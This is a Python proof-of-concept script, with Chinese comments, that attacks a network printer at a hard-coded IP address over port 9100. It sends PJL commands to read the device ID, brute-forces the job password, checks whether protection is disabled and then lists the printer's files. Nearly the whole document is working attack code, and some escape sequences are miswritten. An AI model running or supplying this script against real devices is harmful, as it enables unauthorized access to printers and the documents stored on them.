#-*-coding=utf8 -*-
import socket
import sys
def main():
 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(("113.31.105.130",9100))
    s.settimeout(None)
    # 发送读取设备ID的PJL指令
    s.send(('\033%-12345X@PJL INFO ID\r\n\033%-12345X\r\n').encode('UTF-8'))
    print(s.recv(1024).decode('UTF-8'))
    for i in range(1, 65536):
        buf = b''
        # 发送重置密码的PJL指令
        s.send(('33%-12345X@PJL \r\n@PJL JOB PASSWORD=' + str(i) + '\r\n@PJL DEFAULT PASSWORD=0 \r\n@PJL EOJ\r\n33%-12345X\r\n').encode('UTF-8'))
        if i%30 == 0:
            # 发送查询密码保护状态的PJL指令
            s.send(('\033%-12345X@PJL \r\n@PJL DINQUIRE PASSWORD\r\n\033%-12345X\r\n').encode('UTF-8'))
            while True:
                buf+=s.recv(1)
                print(buf)
                try:
                    buf.index(b'\r\n\x0c')
                    try:
                        # 密码保护被禁用
                        buf.index(b'DISABLED')
                        print('password disabled ok!')
                        # 发送查询目录的PJL指令
                        s.send(('\033%-12345X@PJL \r\n@PJL FSDIRLIST NAME = "0:\\" ENTRY=1COUNT=99\r\n\033%-12345X\r\n').encode('UTF-8'))
                        buf = b''
                        while True:
                            buf+= s.recv(1)
                            print(buf)
                            try:
                                buf.index(b'\r\n\x0c')
                                try:
                                # 查询成功
                                    buf.index(b'ENTRY')
                                    print('PoC OK!')
                                    return
                                except ValueError:
                                    print('PoC NO!')
                                    return
                            except ValueError:
                                continue
                    except ValueError:
                        print('password disabled faild!')
                    finally:
                        s.close()
                        return
                except ValueError:
                    continue
    s.close()
if __name__ == '__main__':
    main()